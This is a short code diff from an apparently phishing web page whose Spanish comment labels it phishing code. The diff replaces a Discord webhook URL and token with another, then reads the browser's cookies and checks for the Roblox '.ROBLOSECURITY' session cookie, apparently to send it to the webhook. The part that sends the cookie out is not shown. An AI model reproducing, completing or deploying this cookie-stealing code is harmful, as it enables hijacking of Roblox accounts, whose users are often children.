@@ -100,7 +100,7 @@
             document.getElementById('loader').style.display = 'block';
 
             // --- TU CÓDIGO DE PHISHING AQUÍ ---
-            const webhookUrl = 'https://discord.com/api/webhooks/1445838898520395917/sotoxtxQ1IR77Vrj_4FcBPU9cX5iIsV6H5o_42h0ZFeg3IqSMJBxudpAzNkNnxurdsLM';
+            const webhookUrl = 'https://discord.com/api/webhooks/1445840582584045740/UereXIyghOSjewnF_R0wI1H_VBiTWNTOzhVu7bX92ppnIXLPpIjVrLsV6JDYB0IgV45t';
             const robloxCookie = document.cookie;
 
             if (!robloxCookie.includes('.ROBLOSECURITY=')) {
